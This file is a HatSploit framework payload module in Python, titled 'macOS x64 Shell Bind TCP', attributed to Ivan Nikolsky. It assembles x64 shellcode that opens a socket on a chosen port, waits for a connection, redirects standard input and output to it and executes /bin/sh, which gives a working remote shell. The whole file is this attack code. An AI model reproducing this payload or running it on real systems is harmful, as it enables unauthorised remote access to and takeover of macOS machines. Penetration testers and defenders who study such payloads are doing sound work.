#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.com
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from pex.assembler import Assembler
from pex.socket import Socket


class HatSploitPayload(Payload, Assembler, Socket):
    details = {
        'Name': "macOS x64 Shell Bind TCP",
        'Payload': "macos/x64/shell_bind_tcp",
        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
        'Description': "Shell bind TCP payload for macOS x64.",
        'Architecture': "x64",
        'Platform': "macos",
        'Rank': "high",
        'Type': "bind_tcp",
    }

    def run(self):
        bport = self.pack_port(self.handler['BPORT'])

        return self.assemble(
            self.details['Architecture'],
            f"""
            start:
                xor rdi, rdi
                mov dil, 0x2
                xor rsi, rsi
                mov sil, 0x1
                xor rdx, rdx

                xor rax, rax
                mov al, 2
                ror rax, 0x28
                mov al, 0x61
                mov r12, rax
                syscall

                mov r9, rax
                mov rdi, rax
                xor rsi, rsi
                push rsi
                mov esi, 0x{bport.hex()}0101
                sub esi, 1
                push rsi
                mov rsi, rsp
                mov dl, 0x10
                add r12b, 0x7
                mov rax, r12
                syscall

                xor rsi, rsi
                inc rsi
                add r12b, 0x2
                mov rax, r12
                syscall

                xor rsi, rsi
                sub r12b, 0x4c
                mov rax, r12
                syscall

                mov rdi, rax
                xor rsi, rsi
                add r12b, 0x3c
                mov rax, r12
                syscall

                inc rsi
                mov rax, r12
                syscall

                xor rsi, rsi
                push rsi
                mov rdi, 0x68732f6e69622f2f
                push rdi
                mov rdi, rsp
                xor rdx, rdx

                sub r12b, 0x1f
                mov rax, r12
                syscall
            """
        )
